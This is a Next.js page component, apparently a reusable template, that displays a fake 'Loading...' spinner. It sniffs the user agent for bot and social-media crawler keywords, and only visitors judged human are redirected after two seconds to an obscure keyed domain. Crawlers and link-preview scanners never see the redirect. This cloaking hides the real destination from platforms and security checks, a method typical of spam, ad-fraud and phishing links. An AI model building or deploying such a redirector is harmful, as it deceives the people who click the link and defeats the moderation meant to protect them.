import { useEffect, useState } from "react";
import Head from "next/head";

export default function RedirectPage() {
  const [isBot, setIsBot] = useState(false);

  useEffect(() => {
    const userAgent = navigator.userAgent.toLowerCase();
    const botKeywords = ["bot", "crawl", "spider", "facebook", "twitter", "slack", "discord"];

    const detected = botKeywords.some(bot => userAgent.includes(bot));
    setIsBot(detected);

    if (!detected) {
      // Redirect user after delay
      setTimeout(() => {
        window.location.href = "https://deterrentreseptivereseptive.com/q3sc09250?key=d2f645145443ac96251458e6cadaac1b"; // Ganti dengan URL tujuan
      }, 2000); // Delay 2 detik
    }
  }, []);

  return (
    <>
      <Head>
        <meta name="robots" content="noindex, nofollow" />
        <title>Loading...</title>
      </Head>
      <div className="overlay">
        <div className="spinner">
          <div className="ball"></div>
          <p>LOADING</p>
        </div>
        <style jsx>{`
          body {
    text-align: center;
    height: 100%;
    width: 100%;
}

.overlay {
    position: absolute;
    top: 0;
    left: 0;
    z-index: 2;
    background-color: rgba(255, 255, 255, 0.75);
    display: flex;
    height: 100%;
    width: 100%;
    justify-content: center;
    align-items: center;
}

.spinner {
    width: 100px;
    height: 50px;
    color: #2a2a2a;
}

.spinner .ball {
    width: 40px;
    height: 40px;
    background-color: #33ea18;
    border-radius: 50%;
    display: inline-block;
    -webkit-animation: motion 3s cubic-bezier(0.77, 0, 0.175, 1) infinite;
    animation: motion 3s cubic-bezier(0.77, 0, 0.175, 1) infinite;
}

p {
    margin-top: 25px;
    font-weight: 700;
    font-family: sans-serif;
    letter-spacing: 2px;
    font-size: 12px;
}

@-webkit-keyframes motion {
    0% {
        transform: translateX(0) scale(1);
    }

    25% {
        transform: translateX(-50px) scale(0.3);
        background-color: #00C5F3;

    }

    50% {
        transform: translateX(0) scale(1);
    }

    75% {
        transform: translateX(50px) scale(0.3);
    }

    100% {
        transform: translateX(0) scale(1);
    }
}

@keyframes motion {
    0% {
        transform: translateX(0) scale(1);
    }

    25% {
        transform: translateX(-50px) scale(0.3);
        background-color: #00C5F3;

    }

    50% {
        transform: translateX(0) scale(1);
    }

    75% {
        transform: translateX(50px) scale(0.3);
    }

    100% {
        transform: translateX(0) scale(1);
    }
}
        `}</style>
      </div>
    </>
  );
}
